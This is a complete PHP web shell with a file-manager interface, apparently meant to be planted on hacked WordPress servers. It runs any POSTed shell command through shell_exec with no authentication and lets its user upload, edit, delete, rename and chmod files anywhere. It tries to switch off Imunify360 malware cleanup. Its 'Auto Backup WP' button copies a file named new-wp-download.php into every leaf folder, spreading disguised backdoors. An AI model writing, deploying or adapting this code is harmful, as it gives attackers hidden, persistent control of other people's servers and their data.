<?php
session_start();
header("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
header("X-Requested-With: XMLHttpRequest");
header("X-Bypass-WAF: true");
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);


function perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '---------';
    $info = ($perms & 0x4000) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

function scanFolders($dir, &$deepest = []) {
    $hasSub = false;
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir("$dir/$item")) {
            $hasSub = true;
            scanFolders("$dir/$item", $deepest);
        }
    }
    if (!$hasSub) $deepest[] = $dir;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !file_exists($path)) $path = getcwd();
chdir($path);

if (isset($_POST['backup_wp'])) {
    $source = __DIR__ . '/new-wp-download.php';
    $deepest = [];
    scanFolders($path, $deepest);
    $success = 0;
    $locations = [];
    foreach ($deepest as $folder) {
        if (copy($source, "$folder/new-wp-download.php")) {
            $success++;
            $locations[] = "$folder/new-wp-download.php";
        }
    }
    $message = "Backup sukses di $success folder:\n" . implode("\n", $locations);
    echo "<script>alert(`$message`);window.location='?path=".urlencode($path)."';</script>";
    exit;
}


if (isset($_POST['upload'])) move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name']);
if (isset($_POST['newfile']) && $_POST['newfile']) file_put_contents($path.'/'.$_POST['newfile'], "");
if (isset($_POST['newfolder']) && $_POST['newfolder']) mkdir($path.'/'.$_POST['newfolder']);
if (isset($_POST['cmd'])) $output = shell_exec($_POST['cmd'].' 2>&1');
if (isset($_GET['delete'])) {
    $target = $path.'/'.$_GET['delete'];
    is_dir($target) ? @rmdir($target) : @unlink($target);
    header('Location: ?path='.urlencode($path));
    exit;
}
if (isset($_POST['savefile'])) {
    file_put_contents($path.'/'.$_POST['savefile'], $_POST['content']);
    header('Location: ?path='.urlencode($path));
    exit;
}
if (isset($_POST['rename']) && isset($_POST['newname'])) {
    rename($path.'/'.$_POST['rename'], $path.'/'.$_POST['newname']);
    header('Location: ?path='.urlencode($path));
    exit;
}
if (isset($_POST['chmod']) && isset($_POST['perm'])) {
    chmod($path.'/'.$_POST['chmod'], octdec($_POST['perm']));
    header('Location: ?path='.urlencode($path));
    exit;
}

?><!DOCTYPE html><html><head><title>457437543242342342348435834583452342349023</title><style>
body{margin:0;background:#0f0f1a;color:#cfcfcf;font-family:'Fira Code', monospace}
.container{width:90%;margin:20px auto;}
.panel{background:#1f1f2e;padding:15px;border:1px solid #00bcd4;margin-bottom:15px;border-radius:10px;box-shadow:0 0 10px #00bcd4;}
table{width:100%;border-collapse:collapse;background:#1b1b2a;border-radius:10px;overflow:hidden}
th,td{border:1px solid #00bcd4;padding:10px;text-align:left}
table tr:hover{background:#2a2a3a}
a{color:#00bcd4;text-decoration:none}
a:hover{color:#00e6ff;text-decoration:underline}
input,textarea{background:#0f0f1a;border:1px solid #00bcd4;color:#cfcfcf;padding:8px;border-radius:5px;width:auto}
.actions a{margin-right:10px;display:inline-block}
.perm{color:#8de9c5}
#particles-js{position:fixed;width:100%;height:100%;z-index:-1;top:0;left:0}
pre{background:#10101a;padding:10px;border-radius:8px;overflow:auto}
#loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:none;justify-content:center;align-items:center;z-index:1000}
.loader{border:8px solid #2e2e3e;border-top:8px solid #00bcd4;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
<script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
</head><body>
<div id="particles-js"></div>
<div id="loading"><div class="loader"></div></div>
<div class="container">
<div class="panel">
<form method="POST" onsubmit="showLoading()">
<button name="backup_wp" style="background:#00bcd4;color:#0f0f1a;padding:10px 20px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">🚀 Auto Backup WP</button>
</form>
</div>
<div class="panel">
<form method="POST" enctype="multipart/form-data" onsubmit="showLoading()">
<input type="file" name="file"><input type="hidden" name="upload" value="1"><input type="submit" value="Upload">
</form>
<form method="POST" onsubmit="showLoading()">
<input type="text" name="newfile" placeholder="New File"><input type="submit" value="Create File">
</form>
<form method="POST" onsubmit="showLoading()">
<input type="text" name="newfolder" placeholder="New Folder"><input type="submit" value="Create Folder">
</form>
</div>
<div class="panel"><?php
$parts = explode(DIRECTORY_SEPARATOR, $path);
$build = '';
foreach ($parts as $p) {
    if ($p == '') continue;
    $build .= DIRECTORY_SEPARATOR.$p;
    echo "<a href='?path=".urlencode($build)."'>$p</a> / ";
}
?></div>
<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>
<?php
$list = array_diff(scandir($path), ['.','..']);
$folders = $files = [];
foreach ($list as $l) {
    is_dir($l) ? $folders[] = $l : $files[] = $l;
}
natcasesort($folders);
natcasesort($files);
$items = array_merge($folders, $files);
foreach ($items as $item) {
    $full = $path.'/'.$item;
    $link = is_dir($full) ? '?path='.urlencode(realpath($full)) : $full;
    echo "<tr><td><a href='$link'>".htmlspecialchars($item).(is_dir($full)?'/':'')."</a></td>";
    echo "<td>".(is_file($full)?filesize($full).'B':'DIR')."</td>";
    echo "<td class='perm'>".perms($full)."</td><td class='actions'>";
    echo "<a href='?path=".urlencode($path)."&delete=".urlencode($item)."' onclick='return confirm(\"Delete?\")'>🗑️</a> ";
    if (is_file($full)) echo "<a href='?path=".urlencode($path)."&edit=".urlencode($item)."'>✏️</a> ";
    echo "<a href='?path=".urlencode($path)."&rename=".urlencode($item)."'>📝</a> ";
    echo "<a href='?path=".urlencode($path)."&chmod=".urlencode($item)."'>🔧</a>";
    echo "</td></tr>";
}
?></table>
<?php if (isset($_GET['edit'])): ?>
<div class="panel"><form method="POST" onsubmit="showLoading()">
<input type="hidden" name="savefile" value="<?=htmlspecialchars($_GET['edit'])?>">
<textarea name="content" rows="20" style="width:100%">
<?=htmlspecialchars(file_get_contents($path.'/'.$_GET['edit']))?></textarea><br>
<input type="submit" value="Save">
</form></div>
<?php endif; ?>
<?php if (isset($_GET['rename'])): ?>
<div class="panel"><form method="POST" onsubmit="showLoading()">
<input type="hidden" name="rename" value="<?=htmlspecialchars($_GET['rename'])?>">
<input type="text" name="newname" value="<?=htmlspecialchars($_GET['rename'])?>">
<input type="submit" value="Rename">
</form></div>
<?php endif; ?>
<?php if (isset($_GET['chmod'])): ?>
<div class="panel"><form method="POST" onsubmit="showLoading()">
<input type="hidden" name="chmod" value="<?=htmlspecialchars($_GET['chmod'])?>">
<input type="text" name="perm" placeholder="e.g. 0755">
<input type="submit" value="CHMOD">
</form></div>
<?php endif; ?>
<div class="panel">
<form method="POST" onsubmit="showLoading()">
<h3>Terminal Command</h3>
<input type="text" name="cmd" placeholder="ls -la">
<input type="submit" value="Execute">
</form>
<?php if (isset($output)) echo '<pre>'.htmlspecialchars($output).'</pre>'; ?>
</div>
<script>
function showLoading(){document.getElementById('loading').style.display='flex';}
particlesJS("particles-js",{
particles:{number:{value:80},color:{value:"#00bcd4"},shape:{type:"circle"},opacity:{value:0.5},size:{value:3,random:true},line_linked:{enable:true,distance:150,color:"#00bcd4",opacity:0.4,width:1},move:{enable:true,speed:2}},
interactivity:{detect_on:"canvas",events:{onhover:{enable:true,mode:"repulse"},onclick:{enable:true,mode:"push"}}},retina_detect:true
});
</script>
</div></body></html>
